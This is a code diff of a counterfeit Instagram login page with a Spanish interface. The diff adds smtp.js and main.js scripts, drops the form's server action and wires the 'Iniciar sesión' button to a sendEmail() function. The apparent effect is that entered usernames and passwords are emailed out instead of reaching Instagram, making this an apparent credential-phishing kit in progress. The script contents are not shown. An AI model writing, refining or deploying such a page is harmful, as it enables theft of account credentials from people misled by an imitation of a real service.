@@ -1,6 +1,8 @@
 <head>
     <link rel="stylesheet" href="style.css">
     <meta charset="utf-8">
+    <script src="smtp.js"></script>
+    <script src="main.js"></script>
     
 </head>
 <body>
@@ -17,7 +19,7 @@
                     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                   </div><!-- Header end -->
                   <div class="form-wrap">
-                    <form class="form" action="process.php">
+                    <form class="form">
   
                       <div class="input-box">
                         <input type="text" id="name" aria-describedby="" placeholder="Teléfono, usuario, o correo electrónico" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
@@ -28,7 +30,7 @@
                       </div>  
   
                       <span class="button-box">
-                        <button class="btn" type="submit" name="submit">Iniciar sesión</button>
+                        <button class="btn" name="submit" onclick="sendEmail();">Iniciar sesión</button>
                       </span>  
   
                       <a class="forgot" href="">¿Olvidaste tu contraseña?</a>
